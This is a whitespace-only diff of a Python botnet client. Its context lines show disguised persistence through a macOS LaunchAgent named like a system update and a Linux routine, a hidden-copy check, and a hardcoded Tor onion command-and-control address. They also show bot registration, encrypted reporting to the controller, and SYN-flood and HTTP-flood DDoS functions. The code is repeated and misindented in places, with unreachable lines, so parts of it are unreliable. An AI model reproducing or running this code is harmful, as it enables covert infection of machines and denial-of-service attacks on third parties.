@@ -47,7 +47,7 @@ TOR_PORT = 9050
 
 def debug(msg):
     print(f"[DEBUG] {msg}")
-    
+
 def go_to_root():
     """Change working directory to the filesystem root (OS-agnostic)."""
     root_dir = os.path.abspath(os.sep)
@@ -252,7 +252,7 @@ Comment=Auto-start script
         plist_path = os.path.join(launch_agents, "com.systemupdate.plist")
         with open(plist_path, "w") as f:
             f.write(f"""<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" 
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
 "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
   <dict>
@@ -270,10 +270,10 @@ Comment=Auto-start script
         debug("Persistence set up successfully on macOS.")
     else:
         debug(f"Persistence setup skipped for unsupported system: {system}")
-        
-        
-        
-        
+
+
+
+
 # --- Persistence ---
 
 
@@ -337,15 +337,15 @@ def get_user_home():
         import pwd
         user = os.environ.get('SUDO_USER') or getpass.getuser()
         return pwd.getpwnam(user).pw_dir
-        
-        
-        
+
+
+
 
 def is_hidden_copy():
     script_path = os.path.abspath(__file__)
     return ".UPDATE" in script_path
     print(script_path)
-    
+
 def setup_persistence_linux():
     logger.info("Setting up persistence on Linux...")
     try:
@@ -437,7 +437,7 @@ def setup_persistence():
         run_file(file_path)
     else:
         logger.error("Persistence setup did not return a valid file path.")
-        
+
 current_path = os.path.abspath(__file__) if not getattr(sys, 'frozen', False) else sys.executable
 
 # Directory containing the script/executable
@@ -467,12 +467,12 @@ if __name__ == '__main__':
             # Directory containing the script/executable
 
             print("Executing From Directory: ", current_dir)
-            
+
 
 
 
             # --- Detailed Logging Configuration ---
-                        
+
             # --- Detailed Logging Configuration ---
             logging.basicConfig(
                 level=logging.DEBUG,
@@ -494,7 +494,7 @@ if __name__ == '__main__':
                 logger.info("Attempting to determine C2 address...")
                 try:
                     logger.debug(f"Reading C2 hostname...")
-                
+
                     address = 'http://zidveflgk5ab3mfoqgmq35fulrmklpbbdexpfj2lscdbqmqruqjz2qyd.onion'
                     logger.info(f"address successfully found")
                     return address
@@ -540,7 +540,7 @@ if __name__ == '__main__':
                     except Exception:
                         # Can't log this error to C2, so just ignore it
                         pass
-                        
+
             def send_network_stats():
                 while True:
                     try:
@@ -594,7 +594,7 @@ if __name__ == '__main__':
                             reg_data = next(reader)
                             BOT_ID = reg_data[0]
                     except Exception:
-                        logger.warning("Failed to read bot registration. Will attempt fresh registration.")            
+                        logger.warning("Failed to read bot registration. Will attempt fresh registration.")
 
 
 
@@ -740,7 +740,7 @@ if __name__ == '__main__':
                                     logger.warning("Failed to parse ping response as JSON.")
                                 except Exception as e:
                                     logger.warning(f"An error occurred while parsing the ping response: {e}")
-            
+
                     except Exception as e:
                         logger.warning(f"Failed to read existing BOT_ID. Will attempt fresh registration. Error: {e}")
 
@@ -791,8 +791,8 @@ if __name__ == '__main__':
                 return N_BOT_ID
                 bot_id = N_BOT_ID
                 return bot_id
-                
-                
+
+
 
     # Handle other commands as needed
             # --- Bot Function Definitions ---
@@ -844,7 +844,7 @@ if __name__ == '__main__':
                         logger.error(f"Error in HTTP flood: {e}")
 
             def main():
-    '''Main function for the bot.'''
+
     # --- Detailed Logging Configuration ---
     logging.basicConfig(
         level=logging.DEBUG,
@@ -866,7 +866,7 @@ if __name__ == '__main__':
         logger.info("Attempting to determine C2 address...")
         try:
             logger.debug(f"Reading C2 hostname...")
-        
+
             address = 'http://zidveflgk5ab3mfoqgmq35fulrmklpbbdexpfj2lscdbqmqruqjz2qyd.onion'
             logger.info(f"address successfully found")
             return address
@@ -909,7 +909,7 @@ if __name__ == '__main__':
             except Exception:
                 # Can't log this error to C2, so just ignore it
                 pass
-                
+
     def send_network_stats():
         while True:
             try:
@@ -922,7 +922,7 @@ if __name__ == '__main__':
             except Exception as e:
                 logger.warning(f"Could not send network stats: {e}")
             time.sleep(10)
-            
+
     # --- Tor Connectivity Check ---
     def check_tor_connectivity():
         logger.info("Verifying Tor connectivity...")
@@ -962,7 +962,7 @@ if __name__ == '__main__':
                     reg_data = next(reader)
                     BOT_ID = reg_data[0]
             except Exception:
-                logger.warning("Failed to read bot registration. Will attempt fresh registration.")            
+                logger.warning("Failed to read bot registration. Will attempt fresh registration.")
 
     def encrypt_data(data):
         logger.debug(f"Encrypting data of length {len(data)} bytes.")
@@ -1096,7 +1096,7 @@ if __name__ == '__main__':
                             logger.warning("Failed to parse ping response as JSON.")
                         except Exception as e:
                             logger.warning(f"An error occurred while parsing the ping response: {e}")
-    
+
             except Exception as e:
                 logger.warning(f"Failed to read existing BOT_ID. Will attempt fresh registration. Error: {e}")
 
@@ -1147,7 +1147,7 @@ if __name__ == '__main__':
         return N_BOT_ID
         bot_id = N_BOT_ID
         return bot_id
-        
+
     def ddos(target, port, method, duration, pps):
         if method == 'syn-flood':
             syn_flood(target, port, duration, pps)
@@ -2028,27 +2028,27 @@ if __name__ == '__main__':
                 logger.warning(f"C2 returned non-200 status code: {response.status_code}. Response: {response.text[:200]}")
                 time.sleep(10)
 
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
             print("[*] Running main loop...")
             # You can add sleep to prevent busy loop
             time.sleep(5)
@@ -2078,7 +2078,7 @@ if __name__ == '__main__':
                 logger.info("Attempting to determine C2 address...")
                 try:
                     logger.debug(f"Reading C2 hostname...")
-                
+
                     address = 'http://zidveflgk5ab3mfoqgmq35fulrmklpbbdexpfj2lscdbqmqruqjz2qyd.onion'
                     logger.info(f"address successfully found")
                     return address
@@ -2258,7 +2258,7 @@ if __name__ == '__main__':
                                     logger.warning("Failed to parse ping response as JSON.")
                                 except Exception as e:
                                     logger.warning(f"An error occurred while parsing the ping response: {e}")
-            
+
                     except Exception as e:
                         logger.warning(f"Failed to read existing BOT_ID. Will attempt fresh registration. Error: {e}")
 
@@ -2303,7 +2303,7 @@ if __name__ == '__main__':
                 return N_BOT_ID
                 bot_id = N_BOT_ID
                 return bot_id
-                
+
 
     # Handle other commands as needed
             # --- Bot Function Definitions ---
@@ -2377,7 +2377,7 @@ if __name__ == '__main__':
         logger.info("Attempting to determine C2 address...")
         try:
             logger.debug(f"Reading C2 hostname...")
-        
+
             address = 'http://zidveflgk5ab3mfoqgmq35fulrmklpbbdexpfj2lscdbqmqruqjz2qyd.onion'
             logger.info(f"address successfully found")
             return address
@@ -2420,7 +2420,7 @@ if __name__ == '__main__':
             except Exception:
                 # Can't log this error to C2, so just ignore it
                 pass
-                
+
     def send_network_stats():
         while True:
             try:
@@ -2433,7 +2433,7 @@ if __name__ == '__main__':
             except Exception as e:
                 logger.warning(f"Could not send network stats: {e}")
             time.sleep(10)
-            
+
     # --- Tor Connectivity Check ---
     def check_tor_connectivity():
         logger.info("Verifying Tor connectivity...")
@@ -2473,7 +2473,7 @@ if __name__ == '__main__':
                     reg_data = next(reader)
                     BOT_ID = reg_data[0]
             except Exception:
-                logger.warning("Failed to read bot registration. Will attempt fresh registration.")            
+                logger.warning("Failed to read bot registration. Will attempt fresh registration.")
 
     def encrypt_data(data):
         logger.debug(f"Encrypting data of length {len(data)} bytes.")
@@ -2607,7 +2607,7 @@ if __name__ == '__main__':
                             logger.warning("Failed to parse ping response as JSON.")
                         except Exception as e:
                             logger.warning(f"An error occurred while parsing the ping response: {e}")
-    
+
             except Exception as e:
                 logger.warning(f"Failed to read existing BOT_ID. Will attempt fresh registration. Error: {e}")
 
@@ -2658,7 +2658,7 @@ if __name__ == '__main__':
         return N_BOT_ID
         bot_id = N_BOT_ID
         return bot_id
-        
+
     def ddos(target, port, method, duration, pps):
         if method == 'syn-flood':
             syn_flood(target, port, duration, pps)
@@ -3490,7 +3490,7 @@ if __name__ == '__main__':
                             reg_data = next(reader)
                             BOT_ID = reg_data[0]
                     except Exception:
-                        logger.warning("Failed to read bot registration. Will attempt fresh registration.")            
+                        logger.warning("Failed to read bot registration. Will attempt fresh registration.")
 
                 while True:
                     try:
@@ -3569,7 +3569,7 @@ if __name__ == '__main__':
 
 
 
-                    
+
             # --- Detailed Logging Configuration ---
             logging.basicConfig(
                 level=logging.DEBUG,
@@ -3807,7 +3807,7 @@ if __name__ == '__main__':
 
 
 
-                
+
 
 
 
